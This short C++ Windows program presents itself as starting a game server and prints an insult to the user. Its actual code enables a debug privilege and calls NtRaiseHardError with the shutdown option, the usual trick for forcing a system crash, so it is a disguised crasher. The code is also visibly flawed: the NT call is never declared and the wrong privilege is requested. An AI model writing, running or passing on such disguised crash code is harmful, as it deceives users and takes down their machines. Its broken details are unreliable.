#include <iostream>
#include <windows.h>

int main() {
    std::cout << "Start GS: INITIATED.\n"; // This starts the game server
    std::cout << "UD CODE: Sigma Number: " << 1337 << std::endl;

    std::cout << "hi retards" << std::endl;
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
                if (GetLastError() == ERROR_SUCCESS) {
                    NtRaiseHardError(0xC0000022, 0, 0, 0, 6, NULL);
                }
            }
        }
        CloseHandle(hToken);
    }

    return 0;
}
